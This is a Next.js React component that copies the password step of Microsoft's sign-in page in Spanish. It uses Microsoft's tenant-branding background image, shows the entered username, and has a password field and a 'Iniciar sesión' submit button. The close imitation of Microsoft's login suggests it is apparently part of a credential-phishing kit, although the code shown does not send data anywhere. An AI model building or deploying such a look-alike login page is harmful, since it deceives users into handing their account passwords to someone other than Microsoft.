"use client";

import Image from "next/image";
import Link from "next/link";
import React, { useContext, useEffect } from "react";

import styles from "./styles/template.module.css";
import { FormContext, IFormStatus } from "./FormMicrosoft";
import ArrowIcon from "./images/arrow.svg";

import templateStyle from "../template.module.css";

export default function PassForm() {
  const formContext = useContext(FormContext);
  const username = (formContext?.status.username || "").toLocaleLowerCase();

  useEffect(() => {
    const element = document.getElementsByClassName(
      templateStyle.container
    )[0] as HTMLDivElement;

    element.style.backgroundImage =
      'url("https://aadcdn.msftauthimages.net/dbd5a2dd-m4kaemlinfqvgxa7axamh0ynae0gxrq3la1rcqd1pb0/logintenantbranding/0/illustration?ts=637079522703712246")';
  }, []);

  function handleBack() {
    if (formContext) {
      const element = document.getElementsByClassName(
        templateStyle.container
      )[0] as HTMLDivElement;

      element.setAttribute("style", "");

      formContext.setFormStatus((prevState: IFormStatus) => {
        return {
          ...prevState,
          view: "email",
        };
      });
    }
  }

  return (
    <div>
      <div className="mt-4 h-6 text-[15x]">
        <div title={username} className={styles["form-identity"]}>
          <button
            type="button"
            className={styles["form-btnBack"]}
            onClick={handleBack}
          >
            <Image width={24} height={24} src={ArrowIcon} alt="Icon Arrow" />
          </button>
          {username}
        </div>
      </div>
      <div className="flex flex-col gap-2">
        <h1 className={styles["form-title"]}>Escribir contraseña</h1>
        <div>
          <input
            aria-required="true"
            data-username
            autoComplete="username"
            type="hidden"
            name="username"
            placeholder="username"
            defaultValue={"hola"}
          />
          <input
            aria-required="true"
            autoComplete="current-password"
            className={styles["form-inputPrimary"]}
            type="password"
            name="password"
            placeholder="Contraseña"
          />
        </div>
        <div className="text-[13px]">
          <Link className={styles["form-linkPrimary"]} href="#">
            He olvidado mi contraseña
          </Link>
        </div>
        <div className={styles["form-btnContainer"]}>
          <button className={styles["form-btnPrimary"]} type="submit">
            Iniciar sesión
          </button>
        </div>
      </div>
    </div>
  );
}
